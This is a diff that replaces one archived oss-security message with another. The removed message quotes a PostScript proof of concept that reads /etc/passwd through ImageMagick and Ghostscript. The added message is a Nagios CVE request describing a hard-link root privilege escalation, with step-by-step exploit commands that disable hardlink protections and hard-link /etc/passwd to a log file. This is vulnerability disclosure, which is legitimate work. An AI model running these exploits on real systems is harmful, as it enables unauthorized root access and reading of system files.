@@ -1,69 +1,105 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/09/29/5
-Message-ID: <877f9vcjd9.fsf@mid.deneb.enyo.de>
-Date: Thu, 29 Sep 2016 08:25:54 +0200
-From: Florian Weimer <fw@...eb.enyo.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/12/30/5
+Message-ID: <e5e71351-83ac-5324-7f70-ad40ef5bf9be@orlitzky.com>
+Date: Fri, 30 Dec 2016 13:37:37 -0500
+From: Michael Orlitzky <michael@...itzky.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: ImageMagick identify "d:" hangs
+Subject: CVE request: Nagios: Incomplete fix for CVE-2016-8641
 Content-Type: text/plain; charset=utf-8
 
-* Tavis Ormandy:
+Author: Michael Orlitzky (michael@...itzky.com)
+Software Name: Nagios
+Vendor Name: Nagios Enterprises, LLC
+Type of vulnerability: root privilege escalation
+Reported to vendor: 2016-12-26
 
-> Here is the code I'm testing with (Note: I really don't know much
-> postscript - and I hate it).
->
-> $ cat test.ps
-> /dumpname {
->     dup             % copy filename
->     dup             % copy filename
->     print           % print filename
->     (\n) print      % print newline
->     status          % stat filename
->     {
->         (stat succeeded\n) print
->         ( ctime:) print
->         64 string cvs print
->         ( atime:) print
->         64 string cvs print
->         ( size:) print
->         64 string cvs print
->         ( blocks:) print
->         64 string cvs print
->         (\n) print
->         (\n) print
->     }{
->         (unable to stat\n\n) print
->     } ifelse
->     .libfile        % open as library
->     {
->         (.libfile returned file\n\n) print
->         64 string readstring
->         pop         % discard result (should proably test)
->         print
->         (\n) print
->     }{
->         (.libfile returned string\n) print
->         print
->         (\n) print
->     } ifelse
-> } def
->
-> (/etc/pass*) /dumpname load 256 string filenameforall
+Exploit Vector
+--------------
+The init script for Nagios calls "chown" on a path under the control of
+Nagios's (usually restricted) user. CVE-2016-8641 describes an attack
+wherein that restricted user replaces the aforementioned path with a
+symlink. The root user (via the init script) will -- the next time
+Nagios is started -- give ownership of the symlink's target to Nagios's
+user. In that manner, the restricted Nagios user can gain root.
 
-filenameforall was fixed as part of this:
+An identical attack not addressed by CVE-2016-8641 works with hard
+links. As long as no special kernel protections are in place, the
+restricted Nagios user can replace the path (in the directory he
+controls) by a hard-link. The call to "chown" in the init script affects
+the target of that hard link.
 
-  http://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=ab109aaeb3ddba59518b036fb288402a65cf7ce8
-  http://bugs.ghostscript.com/show_bug.cgi?id=694724
 
-This also covers getenv and has already been assigned CVE-2013-5653.
+Attack outcome
+--------------
+The restricted Nagios user gains control of any file on the same
+filesystem as its runtime directory.
 
-> $ identify test.ps
-> /etc/passwd
-> stat succeeded
->  ctime:1474998792 atime:1474998792 size:2662 blocks:8
->
-> .libfile returned file
 
-.libfile is not yet fixed upstream.  I reported this upstream:
+Affected versions
+-----------------
+Versions 4.2.2 and older are affected by the symlink attack of
+CVE-2016-8641; those and newer versions, up to the current version
+4.2.4, are affected by the hard-link attack.
 
-  http://bugs.ghostscript.com/show_bug.cgi?id=697169
+
+Source code
+-----------
+The fix for CVE-2016-8641 is contained in the following commit, which
+prohibits "chown" from following symlinks only (via the --no-dereference
+flag):
+
+https://github.com/NagiosEnterprises/nagioscore/commit/f2ed227673d3b2da643eb5cad26b2d87674f28c1
+
+
+Mitigation
+----------
+The creation of the problematic hard link is blocked if the user has the
+fs.protected_hardlinks sysctl enabled. It is *not enabled* by default in
+the vanilla Linux kernel, but some distributions patch that default.
+
+It can be enabled with (as root):
+
+  sysctl -w fs.protected_hardlinks=1
+
+The grsecurity patches for the Linux kernel provide similar protection
+when CONFIG_GRKERNSEC_LINK=y.
+
+
+Exploit
+-------
+
+The following commands should grant ownership of /etc/passwd to the new,
+restricted "nagios" user. Beware that in order for the attack to work,
+some important (but non-default) sysctls are disabled. The two paths
+/etc/passwd and /usr/local/nagios must live on the same filesystem.
+Afterwards you should re-enable the two sysctls (if they were enabled to
+begin with), clean up /usr/local, and remove the "nagios" user.
+
+  sudo mkdir -p /usr/local/tmp \
+                /usr/local/etc/init.d \
+                /usr/local/etc/apache2
+  sudo chmod 777 /usr/local/tmp
+
+  wget
+https://github.com/NagiosEnterprises/nagioscore/archive/release-4.2.4.tar.gz
+  tar -xf release-4.2.4.tar.gz
+  rm release-4.2.4.tar.gz
+  cd nagioscore-release-4.2.4
+  sudo useradd nagios -m -d /home/nagios
+  ./configure --with-nagios-user=nagios \
+              --with-temp-dir=/usr/local/tmp \
+              --with-init-dir=/usr/local/etc/init.d \
+              --with-httpd-conf=/usr/local/etc/apache2
+  make all
+  sudo make install
+  sudo make install-config
+  sudo make install-init
+  sudo sysctl -w kernel.grsecurity.linking_restrictions=0
+  sudo sysctl -w fs.protected_hardlinks=0
+
+  sudo -u nagios -s
+  ln -f /etc/passwd /usr/local/nagios/var/nagios.log
+  exit
+
+  sudo /usr/local/etc/init.d/nagios start
+  ls /etc/passwd
